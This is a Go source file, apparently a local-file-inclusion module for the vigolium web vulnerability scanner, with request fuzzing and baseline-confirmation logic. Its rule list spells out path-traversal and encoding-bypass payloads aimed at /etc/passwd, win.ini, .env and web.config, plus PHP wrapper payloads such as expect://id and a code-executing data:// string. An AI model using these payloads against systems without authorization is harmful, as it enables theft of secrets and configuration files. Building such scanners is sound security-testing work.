package lfi_generic

import (
	"fmt"
	"regexp"

	"github.com/pkg/errors"
	"github.com/vigolium/vigolium/pkg/core/hosterrors"
	"github.com/vigolium/vigolium/pkg/dedup"
	"github.com/vigolium/vigolium/pkg/http"
	"github.com/vigolium/vigolium/pkg/httpmsg"
	"github.com/vigolium/vigolium/pkg/modules/modkit"
	"github.com/vigolium/vigolium/pkg/output"
)

type Module struct {
	modkit.BaseActiveModule
	rules []*rule
	rhm   dedup.Lazy[dedup.RequestHashManager]
}

func New() *Module {
	m := &Module{
		BaseActiveModule: modkit.NewBaseActiveModule(
			ModuleID,
			ModuleName,
			ModuleDesc,
			ModuleShort,
			ModuleConfirmation,
			ModuleSeverity,
			ModuleConfidence,
			modkit.ScanScopeInsertionPoint,
			modkit.AllParamTypes,
		),
		rules: getRules(),
		rhm:   dedup.LazyDefaultRHM("lfi_generic"),
	}
	m.ModuleTags = ModuleTags
	return m
}

// ConfirmsByBodyDifferential opts this module into the executor's body-
// differential safety net: a candidate finding is re-confirmed by replaying the
// traversal request and requiring the included file content to reappear as
// stable content absent from the clean baseline.
func (m *Module) ConfirmsByBodyDifferential() bool { return true }

// VulnClass enables cross-module (param, class) dedup: once any lfi module
// reports a parameter, the others in the class skip it.
func (m *Module) VulnClass() string { return modkit.VulnClassLFI }

// ScanPerInsertionPoint tests a single insertion point for LFI.
func (m *Module) ScanPerInsertionPoint(
	ctx *httpmsg.HttpRequestResponse,
	ip httpmsg.InsertionPoint,
	httpClient *http.Requester,
	scanCtx *modkit.ScanContext,
) ([]*output.ResultEvent, error) {
	urlx, err := ctx.URL()
	if err != nil {
		return nil, errors.Wrap(err, "failed to get URL")
	}

	// Check if we should scan this insertion point
	rhm := m.rhm.Get(scanCtx.DedupMgr())
	if rhm != nil {
		paramName := ip.Name()
		paramType := fmt.Sprintf("%d", ip.Type())
		if !rhm.ShouldCheckInsertionPoint(urlx, ctx.Request(), paramName, ip.BaseValue(), paramType) {
			return nil, nil
		}
	}

	paramValue := ip.BaseValue()
	if !matchTopParams(ip.Name()) && !maybePath(paramValue) {
		return nil, nil
	}

	// Get original response body to avoid false positives
	var origBody string
	if ctx.Response() != nil {
		origBody = ctx.Response().BodyToString()
	}

	var results []*output.ResultEvent

	for _, rule := range m.rules {
		for _, rp := range rule.Payloads() {
			payload := rp.value
			// Build fuzzed request with payload; pre-encoded payloads keep their
			// own percent-encoding.
			fuzzedRaw := httpmsg.BuildPayload(ip, []byte(payload), rp.preEncoded)

			// BuildRequest produces well-formed raw, so wrap directly instead
			// of re-parsing on this hot path.
			fuzzedReq := httpmsg.NewRequestResponseRaw(fuzzedRaw, ctx.Service())

			resp, _, err := httpClient.Execute(fuzzedReq, http.Options{})
			if err != nil {
				if errors.Is(err, hosterrors.ErrUnresponsiveHost) {
					return results, nil
				}
				continue
			}

			// A successful include returns the file content with a 2xx/3xx
			// status. A 4xx/5xx is the server rejecting the path (the payload
			// became a non-existent route) — its error/404 body must never be
			// mistaken for leaked file content, even if that body happens to
			// carry matching tokens or base64 (e.g. CDN 404 pages with data-URI
			// images).
			if r := resp.Response(); r != nil && r.StatusCode >= 400 {
				resp.Close()
				continue
			}

			if rule.MatchWithBaseline(resp.Body().String(), origBody, payload) {
				ev := &output.ResultEvent{
					URL:              urlx.String(),
					Request:          string(fuzzedRaw),
					Response:         resp.FullResponseString(),
					FuzzingParameter: ip.Name(),
					ExtractedResults: []string{payload},
				}
				// A published file reached through a URL path segment was fetched at
				// its own URL, not included: report the exposure informationally, and
				// anchor it at the file's URL since that is the thing to act on.
				if modkit.DocrootFetchNotInclusion(ip.Type(), payload) {
					if fileURL := httpmsg.GetURLFromRequest(urlx.Scheme, fuzzedRaw); fileURL != "" {
						ev.URL = fileURL
						ev.Matched = fileURL
					}
					ev.Info = modkit.DocrootFetchInfo(payload)
				}
				results = append(results, ev)
				resp.Close()
				return results, nil // Found LFI, skip remaining payloads for this IP
			}

			resp.Close()
		}
	}

	return results, nil
}

// https://github.com/projectdiscovery/nuclei-templates/blob/main/dast/vulnerabilities/lfi/lfi-keyed.yaml
func getRules() []*rule {
	var rules []*rule
	linuxRule := newRule(
		[]string{
			"../../etc/passwd",
			"../../../etc/passwd",
			"../../../../etc/passwd",
			"../../../../../../../../../../../../../../../etc/passwd",
			".../.../.../.../.../.../.../.../.../.../.../.../.../.../.../etc/passwd",
			"./.././.././.././.././.././.././.././.././.././.././.././.././.././.././../etc/passwd",
		},
		[]*regexp.Regexp{
			// Require the full /etc/passwd line shape, not just `root:…:0:0:`.
			// A real root entry is `root:x:0:0:root:/root:/bin/bash` — uid 0,
			// gid 0, then a GECOS field, a home directory, and the start of a
			// shell path. The bounded `[^:\r\n]` runs keep the match on a single
			// passwd-shaped line and stop the former greedy `.*` from bridging
			// unrelated `root:` / `:0:0:` tokens that happen to share a line in
			// reflected JSON or HTML.
			regexp.MustCompile(`root:[^:\r\n]{0,64}:0:0:[^:\r\n]{0,64}:[^:\r\n]{0,128}:[^\s:]`),
		},
		[]string{},
	).withPreEncoded(
		"/etc/passwd%00.jpg",
		"../../../../../../../../../../../../../../../etc/passwd%00.jpg",
		`%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd`,
		"%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002fetc%u002fpasswd",
		"%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AFetc%C0%AFpasswd",
		"%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AFetc%C0AFpasswd",
	)
	rules = append(rules, linuxRule)
	/* -------------------------------------------------------------------------- */
	windowsRule := newRule(
		[]string{
			"../../windows/win.ini",
			"../../../windows/win.ini",
			"../../../../windows/win.ini",
			"../../../../../../../../../../../../../../../windows/win.ini",
			// bypass_replace
			".../.../.../.../.../.../.../.../.../.../.../.../.../.../.../windows/win.ini",
			`..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\windows\win.ini`,
			// bypass_waf_regx
			"./.././.././.././.././.././.././.././.././.././.././.././.././.././.././../windows/win.ini",
		},
		// Confirmed by requiring two distinct bracketed win.ini section headers
		// (`[fonts]`, `[extensions]`, …) at line start — see confirmWinIni.
		// The former bare words "fonts"/"extensions" are ordinary English and
		// fired on any page that happened to contain them.
		[]*regexp.Regexp{},
		[]string{},
	).withConfirm(confirmWinIni).withPreEncoded(
		"c:/windows/win.ini%00.jpg",
		"../../../../../../../../../../../../../../../windows/win.ini%00.jpg",
		// double url encode
		`%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fwindows%252fwin.ini`,
		// hex_unicode
		"%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002fwindows%u002fwin.ini",
		// utf8_unicode
		"%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AFwindows%C0%AFwin.ini",
		// utf8_unicode_x
		"%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AFwindows%C0AFwin.ini",
	)
	rules = append(rules, windowsRule)
	/* ------------------------------------------------------------------------- */
	webjarRule := newRule(
		[]string{
			"./web.config",
			"../web.config",
			"../../web.config",
			"./WEB-INF/web.xml",
			"../WEB-INF/web.xml",
			"../../WEB-INF/web.xml",
		},
		[]*regexp.Regexp{
			regexp.MustCompile(`(<web-app[\s\S]+<\/web-app>)`),
		},
		[]string{},
	)
	rules = append(rules, webjarRule)
	/* ------------------------------------------------------------------------- */
	phpWrapperRule := newRule(
		[]string{
			"php://filter/convert.base64-encode/resource=index.php",
			"php://filter/convert.base64-encode/resource=../index.php",
			"php://filter/convert.base64-encode/resource=../../index.php",
			// data:// wrapper: executes the embedded PHP, echoing the marker.
			// Decodes to: <?php echo "vigolium-test"; ?>
			"data://text/plain;base64,PD9waHAgZWNobyAidmlnb2xpdW0tdGVzdCI7ID8+",
			"expect://id",
			"php://input",
		},
		// The convert.base64-encode reads are confirmed by decoding the returned
		// blob and requiring real PHP source (see confirmPHPFilterBase64), not by
		// a bare base64 charset regex — that fired on incidental base64 (data-URI
		// images) in ordinary CDN/static 404 pages.
		[]*regexp.Regexp{},
		[]string{"vigolium-test"},
	).withConfirm(confirmPHPFilterBase64)
	rules = append(rules, phpWrapperRule)
	/* ------------------------------------------------------------------------- */
	// Confirmed by requiring two distinct, file-shaped lines — sensitive
	// `KEY=VALUE` assignments for .env, recognised Apache directives for
	// .htaccess — see confirmAppConfig. The former bare-word AND of
	// DB_PASSWORD/APP_KEY/APP_SECRET both missed real Laravel/Symfony files
	// (which rarely carry all three) and could fire on prose mentioning them.
	appConfigRule := newRule(
		[]string{".env", "../.env", "../../.env", ".htaccess", "../.htaccess"},
		[]*regexp.Regexp{},
		[]string{},
	).withConfirm(confirmAppConfig)
	rules = append(rules, appConfigRule)
	return rules
}
